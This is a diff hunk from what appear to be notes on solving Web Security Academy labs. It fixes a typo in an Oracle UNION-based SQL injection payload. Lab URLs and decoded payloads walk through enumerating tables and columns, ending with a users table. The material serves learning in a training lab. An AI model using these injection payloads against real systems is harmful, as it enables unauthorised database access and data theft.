@@ -94,7 +94,7 @@ https://0aed0078030997ae804821a900e8009a.web-security-academy.net/filter?categor
   #### #### SQL injection attack, listing the database contents on Oracle #### ####
 
 https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20NULL,NULL%20from%20dual--%20-
-' UNION SELECT NULL,NUL from dual-- -
+' UNION SELECT NULL,NULL from dual-- -
 https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20NULL,table_name%20from%20all_tables--%20-
 ' UNION SELECT NULL,table_name from all_tables-- -
 https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20NULL,column_name%20from%20all_tab_columns%20where%20table_name=%27USERS_HANNJE%27--%20-
